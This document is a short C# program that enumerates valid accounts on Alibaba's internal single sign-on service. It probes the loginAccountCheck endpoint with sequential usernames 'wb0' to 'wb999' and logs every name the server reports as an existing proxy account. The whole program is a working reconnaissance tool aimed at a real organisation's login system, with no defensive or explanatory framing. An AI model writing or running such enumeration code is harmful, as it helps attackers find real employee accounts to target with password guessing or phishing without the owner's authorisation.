using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;

namespace getAlicount
{
    class Program
    {
        static void Main(string[] args)
        {
            StreamWriter sw = new StreamWriter("1.txt", true);
            StreamWriter sw2 = new StreamWriter("2.txt", true);
            httphelper hp = new httphelper();
            hp.Cookie = "";
            for (int i=0;i<1000; i++) {
                try {
                    Thread.Sleep(1000);
                    hp.Url = "https://login.alibaba-inc.com/rpc/sso/loginAccountCheck.json?account=wb" + i.ToString() + "&appName=";
                    string re = hp.getUrl();
                    if (re.Contains("isProxyAccount"))
                    {
                        sw.WriteLine(i.ToString());
                        Console.WriteLine(i);
                        sw.Flush();
                    }
                }
                catch (Exception ex) {
                    sw2.Write(ex.ToString());
                    sw2.WriteLine("======================================"+i.ToString() + "======================================");
                    sw2.Flush();
                    Console.WriteLine("出错了");
                    break;
                }
                Console.Clear();
                Console.WriteLine(i);
            }
            Console.ReadKey();
        }
    }
}
